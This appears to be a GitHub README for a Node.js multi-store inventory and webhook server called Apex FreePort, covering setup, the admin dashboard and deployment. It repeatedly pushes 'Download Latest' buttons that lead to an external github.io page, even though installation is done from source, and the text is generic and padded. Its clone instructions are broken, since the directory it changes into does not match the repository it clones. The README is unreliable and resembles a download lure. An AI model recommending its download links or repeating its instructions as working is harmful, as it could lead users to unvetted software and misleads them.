# Apex FreePort Latest - E-commerce Inventory Management 2026

> **Apex FreePort is a self-hosted Node.js web server for coordinating inventory across multiple e-commerce stores, serving current product catalogs, and linking store processes through APIs and webhooks.**

[![Platform](https://img.shields.io/badge/Platform-Node.js%20web%20server-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelsapvparker7052/apex-freeport-webhook-hub?style=flat-square)](https://github.com/michaelsapvparker7052/apex-freeport-webhook-hub)

---

<p align="center">
  <a href="https://michaelsapvparker7052.github.io/apex-freeport-webhook-hub/">
    <img src="https://img.shields.io/badge/Download-Apex%20FreePort%20Latest-brightgreen?style=for-the-badge" alt="Download Apex FreePort">
  </a>
</p>

> **[Download Apex FreePort Latest](https://michaelsapvparker7052.github.io/apex-freeport-webhook-hub/)**

---

[Download Latest Build](https://michaelsapvparker7052.github.io/apex-freeport-webhook-hub/)

---

## Overview

Apex FreePort gives small e-commerce teams a central way to maintain inventory and store catalogs. Products can be organized by store while the system records SKU counts, pricing, lanes, and statuses. A public product feed is also available and can be switched on or off by the operator.

Built for self-managed hosting, the application combines an administration dashboard with store-level catalogs, REST API access, and webhook integration points. Herp, K9, and Feline catalogs are supported, and the service can be operated on hosts such as Amazon Linux and EC2.

---

## Core Capabilities

- Maintain per-store SKU quantities, prices, lanes, and statuses.
- Keep distinct catalogs for Herp, K9, and Feline stores.
- Make a current product feed publicly available when desired.
- Protect the administration interface at `/admin` with a password.
- Retrieve product and inventory information through REST endpoints.
- Support connected processes through webhook endpoints.
- Provide a health check endpoint for availability monitoring.
- Operate as a self-hosted Node.js service with systemd recovery support.

---

## Getting Started

First clone the project and move into its directory:

```bash
git clone https://github.com/michaelsapvparker7052/apex-freeport-webhook-hub.git
cd apex-freeport-inventory-control-bridge
```

Install the required packages:

```bash
npm install
```

Launch the server with the project's start command:

```bash
npm start
```

When deploying to a server, adapt the application settings for the destination host. The supplied systemd service configuration can be used where suitable. The documented self-hosted deployment scenario includes Amazon Linux and EC2.

---

## Working with the Application

1. Launch the Node.js service.
2. Visit the administrator route:

   `http://your-server/admin`

3. Enter the configured dashboard password.
4. Choose the store whose catalog you want to manage.
5. Create or revise products, SKUs, quantities, prices, lanes, and statuses.
6. Turn on the public feed once the catalog is ready to publish.
7. Retrieve product and inventory data through the REST API.
8. Integrate outside processes using the available webhook endpoints.
9. Query the health endpoint to monitor the service or investigate an outage.

The server's host and port are determined by the deployment configuration.

---

## Deployment Configuration

Configuration is applied on the machine running the Node.js service. Administrative credentials and other host-specific server values should remain outside files that can be accessed publicly.

Use this checklist as a starting point for a deployment:

```text
Application: Apex FreePort
Runtime: Node.js
Admin route: /admin
Public feed: enabled or disabled
Stores: Herp, K9, Feline
Process manager: systemd
Deployment target: Amazon Linux or EC2
```

Before setting up a production service, inspect the repository's configuration files and startup scripts. Whenever configuration changes are made, restart the Node.js process or the corresponding systemd unit.

---

## System Requirements

- Node.js runtime
- npm or another compatible Node.js package manager
- A server capable of running a Node.js web application
- Storage for product catalog and inventory data
- Network access for the web dashboard, public feed, APIs, and webhooks
- Optional systemd support for automatic reboot recovery
- Amazon Linux or EC2 for the documented server deployment scenario

---

## Frequently Asked Questions

### What type of business uses Apex FreePort?

Apex FreePort is aimed at small e-commerce operations that want to host their own inventory and catalog system across multiple stores.

### Where is the admin dashboard located?

Use the `/admin` path on the Apex FreePort server, then log in with the dashboard password configured for the deployment.

### Is the public catalog optional?

Yes. The public product feed has an on/off setting, allowing operators to decide whether the catalog is currently visible.

### Which store catalogs are included?

The described setup supports Herp, K9, and Feline store catalogs.

### How do external services integrate with the application?

External systems can use the product and inventory REST API endpoints, while connected workflows can be built around the available webhooks.

### What steps help diagnose an unavailable service?

Check that the Node.js process is active, inspect its logs, and confirm the configured host and port. Query the health check endpoint as well. For systemd-managed deployments, review the unit status and its restart behavior.

### What is the update procedure?

Obtain the newest project files, run `npm install` for dependency updates, check any configuration changes, and restart the application or its systemd service.

### How should private deployment values be handled?

Store operational configuration on the server and limit access to administrative credentials. Private settings should not be published in the repository or exposed through the public product feed.

---

## Future Work

- Further streamline multi-store catalog operations.
- Provide better operational insight into API, webhook, and health check activity.
- Add more deployment documentation for self-hosted Node.js installations.

---

## License

Apex FreePort is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for details.
